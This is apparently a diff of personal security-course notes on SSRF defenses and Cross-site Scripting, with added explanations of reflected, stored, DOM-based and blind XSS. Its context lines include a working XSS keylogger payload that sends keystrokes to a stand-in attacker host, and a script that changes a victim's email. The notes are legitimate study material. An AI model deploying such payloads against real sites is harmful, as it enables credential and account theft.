@@ -8055,7 +8055,7 @@ Defeating common SSRF defenses
 - allow list, where all requests get denied unless they appear on a lust or match a particular pattern
 - Open redirect, is an endpoint on the server where the website visitor gets automatically redirected to another website address</rich_text>
       </node>
-      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710374334">
+      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710465363">
         <rich_text>Introduction
 - XSS is based on JS
 - injection attack where malicious JS gets injected into a web app with the intetion of being executed by other users
@@ -8070,7 +8070,28 @@ XSS Payloads
 - key logger:
    → acts like keylogger. all typed in the webpage will be forwarded to a website under the hacker's control: &lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) ); }&lt;/script&gt;
 - Business Logic
-   → is more specific, would be about calling a particular network resource or a JS function: &lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</rich_text>
+   → is more specific, would be about calling a particular network resource or a JS function: &lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;
+
+Reflected XSS
+- user-supplied data in an HTTP request is included in the webpage source without any validation
+- attacker could send links or embed them into an iframe on another website containing  a JS payload
+- use in parameters in the URL query String, URL File Path, sometimes HTTP Headers
+- this change and add files in parameters
+
+Stored XSS
+- stored on the web application and then gets run when other users visit the site or web
+- redirect to another site, steal the user's session cookie or perform another action
+- 
+
+DOM Based XSS
+- Documento Object Model
+- programns can change the document structure, style and content
+- Where ths JS execution happens directly in the browser  without any new pages being loaded or data submitted
+- used of insecure methods like eval
+
+Blind XSS
+- similar to stored XSS, payload get stored on the website for another user to view
+- gennerally is used a call back - HTTP request, popular tool: XSS Hunter Express</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
